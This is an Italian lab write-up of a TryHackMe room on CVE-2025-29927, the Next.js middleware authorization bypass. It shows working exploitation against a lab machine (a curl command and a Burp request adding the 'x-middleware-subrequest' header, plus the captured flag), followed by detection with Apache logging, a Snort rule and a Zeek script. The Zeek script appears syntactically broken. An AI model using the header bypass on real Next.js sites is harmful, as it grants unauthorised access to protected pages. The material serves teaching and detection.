
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/nextjscve202529927

Next.js è un framework di sviluppo web sviluppato da Vercel per semplificare la creazione di applicazioni web ad alte prestazioni. Costruito su React, Next.js estende le capacità di React aggiungendo diverse funzionalità, come la generazione di siti statici (SSG) e il rendering lato server (SSR). SSG pre-genera le pagine in fase di compilazione, consentendo una distribuzione più rapida agli utenti; inoltre, SSR esegue il rendering delle pagine in fase di richiesta, riducendo il tempo di caricamento. In breve, Next.js ha aggiunto funzionalità per migliorare le prestazioni e l'esperienza utente.

[CVE -2025-29927](https://nvd.nist.gov/vuln/detail/CVE-2025-29927) , una vulnerabilità recente scoperta da [Rachid e Yasser Allam](https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware) in Next.js, ha rivelato che è possibile aggirare i controlli di autorizzazione se si verificano nel middleware. Il middleware è la parte che garantisce agli sviluppatori il controllo sulle richieste in arrivo. Agisce come un ponte tra la richiesta in arrivo e il sistema di routing. Il sistema di routing è basato su file, ovvero le rotte vengono create e gestite organizzando file e directory. Questa vulnerabilità consente agli aggressori di aggirare l'autorizzazione basata sul middleware e tutte le versioni precedenti alla 14.2.25 e alla 15.2.3 sono soggette a questa vulnerabilità.

Next.js è ampiamente utilizzato in vari tipi di applicazioni, tra cui piattaforme di e-commerce, app di notizie, siti di documentazione e app Web interattive. Di conseguenza, questa vulnerabilità può avere conseguenze disastrose e richiede agli amministratori di aggiornare le proprie installazioni a una versione patchata.

In questa sala esploreremo come sfruttare e rilevare questa vulnerabilità.


[Un'app sfruttabile](https://github.com/aydinnyunus/CVE-2025-29927) proof of concept ( PoC ) e un codice exploit sono pubblicati da Yunus Aydin su GitHub. Abbiamo adattato l'app e l'abbiamo ospitata sulla VM allegata . Puoi visualizzare l'applicazione web di esempio visitando su AttackBox. Tuttavia, se provi ad accedere al percorso protetto su , verrai reindirizzato alla home page.[](https://github.com/aydinnyunus/CVE-2025-29927)`http://MACHINE_IP:3000``http://MACHINE_IP:3000/protected`

**curl**

Sfruttare la vulnerabilità CVE -2025-29927 è piuttosto semplice; tutto ciò che l'attaccante deve fare è aggiungere l' intestazione HTTP`x-middleware-subrequest: middleware` extra nella sua richiesta. Come spiegato nel [post originale](https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware) che rivela questa vulnerabilità, l'aggiunta dell'intestazione `x-middleware-subrequest`porta la richiesta a essere inoltrata alla sua destinazione senza che il middleware la manipoli. Di conseguenza, non serve altro che usare `curl`con l'argomento di intestazione appropriato per accedere a percorsi protetti, ovvero pagine.

Sfruttando questa vulnerabilità possiamo accedere alla pagina protetta. Un modo semplice è quello di inviare il comando qui sotto nel terminale su AttackBox.

`curl -H "x-middleware-subrequest: middleware" http://MACHINE_IP:3000/protected`

Il comando è come un normale `curl`comando con un'eccezione: usa `-H`, un equivalente di `--header`, per aggiungere un'intestazione extra alla richiesta HTTP GET. Di conseguenza, il `curl`comando sopra riportato consente all'attaccante di aggirare tutti i controlli di sicurezza e recuperare la pagina protetta.

**Burp Suite**

Se preferisci un'interfaccia utente grafica, è altrettanto facile sfruttare questa vulnerabilità usando Burp Suite . Un modo semplice per farlo è usare il browser di Burp Suite e modificare le richieste mentre accedi `http://MACHINE_IP:3000/protected`.

Se non hai familiarità con Burp Suite , puoi seguire i seguenti passaggi dopo aver avviato Burp Suite :

1. Vai alla scheda **Proxy** e assicurati che **Intercept** sia attivo. Questo assicurerà che Burp Suite intercetti tutte le richieste HTTP e ti dia la possibilità di modificarle prima che vengano inviate al server web.
2. Fare clic sul pulsante **Apri browser** e andare su `http://MACHINE_IP:3000/protected`.
3. La richiesta HTTP viene intercettata e rimane bloccata finché non si fa clic sul pulsante **Avanti** .

Individua i tre pulsanti per attivare Intercept, aprire il browser e inoltrare la richiesta HTTP

Prima di premere il pulsante **Avanti** , devi aggiungere `x-middleware-subrequest: middleware`alle tue intestazioni HTTP . L'immagine qui sotto mostra un esempio di un'intestazione manipolata. Puoi vedere i risultati nel browser.

```
http://10.10.107.96:3000
```

```
http://10.10.107.96:3000/protected
```

accedere alla pagina protetta con curl
```
curl -H "x-middleware-subrequest: middleware" http://10.10.107.96:3000/protected
```
oppure accedere con burpsuite

aggiungere  sotto Hosts nella scheda Intercept e poi premere  Forward
```
x-middleware-subrequest: middleware
```

```
GET / HTTP/1.1
Host: 10.10.107.96:3000
x-middleware-subrequest: middleware
User-Agent: J
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-None-Match: "1v6j6mhmf35h7"
```

```
THM{NEXT_MDLE_JS}
```


**Rilevamento**

Ricordiamo dalle attività precedenti che CVE -2025-29927 per Next.js è un bypass dell'autorizzazione middleware, che consente di accedere a pagine e percorsi che in precedenza richiedevano tale autorizzazione.

In questa attività verranno illustrate alcune tecniche e regole che possono essere utilizzate per rilevare l'avvenuto attacco, sia tramite i log che tramite il traffico di rete.

**Manuale**

I log del server Web possono potenzialmente essere utilizzati per scoprire prove di questo exploit in atto. Tuttavia, dipenderà dal fatto che il server Web sia configurato o meno per registrare le intestazioni HTTP . Ad esempio, NodeJS consente la registrazione di questa specifica intestazione HTTP tramite `request.headers['x-middleware-subrequest']`

Se l'applicazione web è proxy, la configurazione di registrazione su server web come Nginx o Apache2 dovrà essere modificata per registrare questa specifica intestazione. Ad esempio, **LogFormat** all'interno di Apache2 può essere utilizzato:

`LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" \"%{x-middleware-subrequest}i\"" custom`

Una volta impostata correttamente la registrazione di questa intestazione HTTP , è possibile utilizzare strumenti comuni come Grep, Yara, ecc.

**Snort (v2)**

La seguente regola Snort, se utilizzata come IDS , può essere utilizzata per rilevare l'esecuzione di CVE -2025-29927:

```bash
alert tcp any any -> any any (msg: "HTTP 'x-middleware-request' header detected, possible CVE-2025-29927 explotation"; content:"x-middleware-subrequest";  rawbytes; sid:10000001; rev:1)
```

Questa regola ispeziona il pacchetto senza fattorizzare o considerare alcun protocollo, ad esempio il `http_headers`modulo. Questo perché l' intestazione HTTP "x-middleware-request" non è un'intestazione [riconosciuta](https://docs.snort.org/rules/options/payload/http/header) all'interno di Snort al momento della scrittura.

Per prima cosa, aggiungeremo la regola Snort alle nostre regole locali. Di default, su Ubuntu, si trova in `/etc/snort/rules/local.rules`. Ora incolleremo il frammento di codice sopra e salveremo. Nota che dovrai cambiare il `sid` valore in un altro se hai regole esistenti.

Modifica delle local.rules di Snort

```bash
ubuntu@tryhackme-2404:~$ sudo nano /etc/snort/rules/local.rules
- $Id: local.rules,v 1.11 2004/07/23 20:14:44 bmc Exp $
- ----------------
- LOCAL RULES
- ----------------
- This file intentionally does not come with signatures.  Put your local
-
additions here.
alert tcp any any -> any any (msg: "HTTP 'x-middleware-request' header detected"; content:"x-middleware-subrequest";  rawbytes; sid:10000001; rev:1)
```

Ora possiamo eseguire Snort e testare il rilevamento. Il terminale seguente esegue Snort in modalità console per dimostrare l'attivazione dell'avviso.

Rilevamento dello sbuffoCVE-2025-29927

```bash
ubuntu@tryhackme-2404:/var/log/snort$ sudo snort -q -l /var/log/snort -i ens5 -A console -c /etc/snort/snort.conf
03/24-20:16:13.424299  [**] [1:10000001:1] HTTP 'x-middleware-request' header detected [**] [Priority: 0] {TCP} 10.10.142.69:49432 -> 10.10.219.251:3000
```

**Zeek**

Zeek offre un'opportunità più completa per il rilevamento delle minacce nel traffico di rete. Per  CVE -2025-29927, è possibile utilizzare la seguente regola Zeek :

```bash
module CVE_2025_29927;

export {
    redef enum Log::ID += { LOG };
    global log_policy: Log::PolicyHook = Log::IGNORE;

    event http_header(c: connection, is_orig: bool, name: string, value: string) {
        if (name == "x-middleware-subrequest" && value == "middleware")
            Log::write(HTTP::LOG, [
                $timestamp=c$start_time,
                $uid=c$uid,
                $id=c$id,
                $note="CVE_2025_29927_Exploit",
                $msg="Detected HTTP header associated with CVE-2025-29927",
                $header=name,
                $value=value
           ]);
        notice_info(c, "CVE-2025-29927 Exploit", fmt("The HTTP header '%s' associated with CVE-2025-29927 was detected", value));
    }
  }
}
```

Assicurati che questo file venga salvato con l' `.zeek`estensione nella directory configurata per gli script Zeek . Dovrai modificare il tuo `local.zeek`per includere questo script aggiungendo `@load ./cve_2025_29927.zeek`.

Infine, riavvia Zeek per applicare le modifiche alla configurazione tramite `sudo zeekctl deploy`. Se l'operazione ha esito positivo, Zeek ora avviserà quando viene rilevato CVE -2025-29927:

```bash
[Connnection_ID] The HTTP header "x-middleware-subrequest" associated with CVE-2025-29927 was detected
```
